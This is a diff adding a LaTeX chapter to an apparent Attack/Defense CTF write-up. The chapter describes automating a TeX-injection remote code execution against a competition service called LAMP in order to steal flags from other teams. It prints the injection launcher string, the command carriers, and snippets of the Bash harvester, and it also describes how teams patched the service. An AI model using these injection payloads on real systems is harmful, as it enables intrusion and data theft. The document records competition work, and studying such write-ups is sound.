@@ -1,0 +1,353 @@
+% ============================================================
+% 08 -- AUTOMATION
+% ============================================================
+
+\section{Automating the Exploit}
+\label{sec:automation}
+
+Running the exploit manually was enough to prove the vulnerability.
+
+It was not enough for an Attack/Defense CTF.
+
+The useful version needed to:
+
+\begin{itemize}
+
+  \item iterate over competition targets;
+
+  \item skip our own Vulnbox and infrastructure targets;
+
+  \item determine whether a target was reachable;
+
+  \item create the required command carriers;
+
+  \item trigger the TeX RCE;
+
+  \item retrieve and extract flags;
+
+  \item submit them immediately;
+
+  \item and continue working while teams patched their services.
+
+\end{itemize}
+
+The resulting Bash harvester became:
+
+\begin{center}
+  \displayfont\large\bfseries
+  \code{lamp-brrr.sh}
+\end{center}
+
+
+% ------------------------------------------------------------
+% 8.1
+% ------------------------------------------------------------
+
+\subsection{Targeting a Team}
+
+LAMP instances followed the normal FAUST Vulnbox addressing scheme:
+
+\begin{lstlisting}
+fd66:666:<team>::2
+\end{lstlisting}
+
+with LAMP listening on:
+
+\begin{lstlisting}
+TCP/1337
+\end{lstlisting}
+
+The helper used:
+
+\begin{lstlisting}
+target_url() {
+  printf 'http://[fd66:666:%s::2]:%s' \
+    "$1" "$PORT"
+}
+\end{lstlisting}
+
+Before attempting exploitation, each target received a cheap request to
+the legitimate registration page.
+
+If that failed, the script moved on rather than wasting time creating
+carriers against an unreachable service.
+
+
+% ------------------------------------------------------------
+% 8.2
+% ------------------------------------------------------------
+
+\subsection{One Target, Two Carriers}
+
+The final harvesting logic used two command carriers.
+
+The first collected a small set of recent checker-like storage files:
+
+\begin{lstlisting}
+ls -1t /storage/????????????????.tex \
+  | head -30 > /mTEAMa
+\end{lstlisting}
+
+A short one-character account was registered with this command embedded
+into its ship name.
+
+The component-type RCE then executed that storage file.
+
+The second carrier searched only the resulting file list:
+
+\begin{lstlisting}
+cat /mTEAMa |
+xargs grep -h FAUST > /mTEAMb
+\end{lstlisting}
+
+That carrier was triggered in exactly the same way.
+
+Finally, the output file was retrieved using the original
+\code{Path} vulnerability.
+
+The per-team workflow therefore looked like:
+
+\begin{center}
+\begin{tabular}{c}
+  check service \\[0.25em]
+  $\downarrow$ \\[0.25em]
+  register stage-one carrier \\[0.25em]
+  $\downarrow$ \\[0.25em]
+  trigger tiny TeX launcher \\[0.25em]
+  $\downarrow$ \\[0.25em]
+  register stage-two carrier \\[0.25em]
+  $\downarrow$ \\[0.25em]
+  trigger launcher again \\[0.25em]
+  $\downarrow$ \\[0.25em]
+  retrieve result with \code{Path:} \\[0.25em]
+  $\downarrow$ \\[0.25em]
+  extract flags
+\end{tabular}
+\end{center}
+
+
+% ------------------------------------------------------------
+% 8.3
+% ------------------------------------------------------------
+
+\subsection{Disposable Accounts}
+
+Carrier accounts only existed to provide a conveniently named file under
+\code{/storage}.
+
+The script therefore tried short usernames from a fixed pool:
+
+\begin{lstlisting}
+0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
+\end{lstlisting}
+
+A successful registration returned both:
+
+\begin{lstlisting}
+username
+cookie jar
+\end{lstlisting}
+
+The cookie was required because adding the malicious component had to
+happen inside the newly created authenticated session.
+
+Using one-character usernames also kept the launcher short:
+
+\begin{lstlisting}
+^^5cUseName{@@input}|"sh%20/s*/Q*"
+\end{lstlisting}
+
+During the competition this mattered more than elegance.
+
+
+% ------------------------------------------------------------
+% 8.4
+% ------------------------------------------------------------
+
+\subsection{Extracting Only Valid Flags}
+
+After retrieving the result file, the harvester normalized LAMP's stored
+representation and extracted only strings matching the FAUST flag format:
+
+\begin{lstlisting}
+perl -pe 's/\\Uchar95\s*/_/g' "$raw" |
+grep -aoE 'FAUST_[A-Za-z0-9+/]{32}' |
+sort -u
+\end{lstlisting}
+
+This was deliberately done locally.
+
+The remote command only needed to collect interesting lines.
+
+Parsing, normalization, validation, and deduplication were cheaper and
+easier to maintain on the attacking machine.
+
+
+% ------------------------------------------------------------
+% 8.5
+% ------------------------------------------------------------
+
+\subsection{Submitting Through MOTH}
+
+Extracted flags were sent to our internal MOTH submission service as a
+batch.
+
+The exploit constructed a payload resembling:
+
+\begin{lstlisting}
+{
+  "flags": [...],
+  "service": "LAMP",
+  "source": "lamp-brrr-team-<team>"
+}
+\end{lstlisting}
+
+Authentication used an environment-provided bearer token:
+
+\begin{lstlisting}
+Authorization: Bearer $MOTH_API_TOKEN
+\end{lstlisting}
+
+No submission token was stored directly inside the public exploit code.
+
+MOTH handled flag validation, duplicate detection, and communication with
+the competition submission endpoint.
+
+That allowed the exploit itself to remain focused on one job:
+
+\begin{center}
+  \displayfont\bfseries
+  get valid flags out of LAMP as quickly as possible.
+\end{center}
+
+
+% ------------------------------------------------------------
+% 8.6
+% ------------------------------------------------------------
+
+\subsection{Parallelism}
+
+Attacking every Vulnbox sequentially would have been unnecessarily slow.
+
+Different teams were independent targets, so the harvester ran several
+team jobs concurrently while enforcing a worker limit:
+
+\begin{lstlisting}
+while IFS= read -r team; do
+
+  attack_team "$team" &
+
+  while (( $(jobs -rp | wc -l) >= WORKERS )); do
+    wait -n || true
+  done
+
+done < "$TEAMS_FILE"
+
+wait || true
+\end{lstlisting}
+
+This provided useful concurrency without spawning hundreds of
+simultaneous exploit attempts from our own machine.
+
+
+% ------------------------------------------------------------
+% 8.7
+% ------------------------------------------------------------
+
+\subsection{The Target Was Moving}
+
+The exploit did not remain universally usable for long.
+
+Teams were actively patching LAMP while the competition continued.
+
+Observed behaviour therefore varied between targets:
+
+\begin{itemize}
+
+  \item some services were unreachable;
+
+  \item some accepted registration but rejected the malicious component;
+
+  \item some had already blocked the \code{Path} collision;
+
+  \item and a small number still exposed the complete exploit chain.
+
+\end{itemize}
+
+The patched service versions we inspected added exactly the kinds of
+checks the exploit depended on:
+
+\begin{itemize}
+
+  \item reserved HTTP header names such as \code{Path} were rejected;
+
+  \item component types were restricted to
+        \code{light}, \code{button}, or \code{source};
+
+  \item and ship names received a strict character allowlist that removed
+        the newline carrier.
+
+\end{itemize}
+
+\begin{findingbox}
+The operational challenge was not merely writing an exploit.
+
+It was continuously distinguishing:
+
+\begin{center}
+  down
+  \quad // \quad
+  broken
+  \quad // \quad
+  patched
+  \quad // \quad
+  still vulnerable
+\end{center}
+
+while the state of the competition changed underneath us.
+\end{findingbox}
+
+
+% ------------------------------------------------------------
+% 8.8
+% ------------------------------------------------------------
+
+\subsection{The Final Automated Chain}
+
+By the end, the complete workflow was:
+
+\begin{center}
+\begin{tabular}{c}
+  select competitor \\[0.25em]
+  $\downarrow$ \\[0.25em]
+  test LAMP availability \\[0.25em]
+  $\downarrow$ \\[0.25em]
+  create newline carriers \\[0.25em]
+  $\downarrow$ \\[0.25em]
+  trigger stored TeX RCE \\[0.25em]
+  $\downarrow$ \\[0.25em]
+  locate recent checker storage \\[0.25em]
+  $\downarrow$ \\[0.25em]
+  extract FAUST-bearing lines \\[0.25em]
+  $\downarrow$ \\[0.25em]
+  retrieve them through \code{Path:} \\[0.25em]
+  $\downarrow$ \\[0.25em]
+  normalize and deduplicate flags \\[0.25em]
+  $\downarrow$ \\[0.25em]
+  submit through MOTH
+\end{tabular}
+\end{center}
+
+At that point, LAMP had officially gone from:
+
+\begin{center}
+  \displayfont
+  ``why is this web server written in XeLaTeX?''
+\end{center}
+
+to:
+
+\begin{center}
+  \displayfont\large\bfseries
+  automated flag theft.
+\end{center}
